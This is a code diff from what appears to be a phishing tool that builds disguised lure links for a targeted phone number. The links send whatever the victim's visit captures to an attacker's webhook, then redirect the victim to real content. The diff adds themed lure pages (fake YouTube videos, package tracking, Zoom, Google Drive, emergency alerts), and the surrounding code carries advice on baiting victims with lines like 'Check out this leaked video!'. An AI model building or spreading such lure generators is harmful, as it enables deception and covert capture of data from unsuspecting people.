@@ -278,9 +278,18 @@ if (genPayloadBtn) {
         const webhook = document.getElementById('payload-webhook').value || "";
         const targetNum = phoneInput.value.replace(/\D/g, '') || "XXXXX";
 
-        // Generate real functioning URL pointing to our payload.html
+        const lurePages = {
+            'youtube': 'video.html',
+            'track-package': 'tracker.html',
+            'near-me': 'payload.html',
+            'zoom': 'payload.html',
+            'gdrive': 'payload.html',
+            'emergency': 'payload.html'
+        };
+
+        const themePage = lurePages[type] || 'payload.html';
         const baseUrl = window.location.href.split('index.html')[0];
-        lastGeneratedLink = `${baseUrl}payload.html?wh=${encodeURIComponent(webhook)}&t=${targetNum}&r=${encodeURIComponent(redirect)}`;
+        lastGeneratedLink = `${baseUrl}${themePage}?wh=${encodeURIComponent(webhook)}&t=${targetNum}&r=${encodeURIComponent(redirect)}`;
 
         const luringAdvice = {
             'youtube': 'HINT: Share as "Check out this leaked video!" The redirect will take them to the real video after capture.',
